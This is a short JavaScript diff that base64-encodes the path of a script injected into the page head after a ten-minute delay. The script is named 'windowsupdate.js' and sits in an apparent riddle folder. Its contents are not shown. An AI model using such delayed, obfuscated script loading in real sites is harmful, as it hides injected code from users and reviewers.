@@ -45,4 +45,4 @@ $(document).ready(function () {
 });
 
 // Uhh look! There's something interesting here:
-setTimeout(function(){$('<script>').appendTo('head').attr({src:'verysecretriddles/windowsupdate.js'});},300000);
+setTimeout(function(){$('<script>').appendTo('head').attr({src:atob('dmVyeXNlY3JldHJpZGRsZXMvd2luZG93c3VwZGF0ZS5qcw==')});}, 600000);
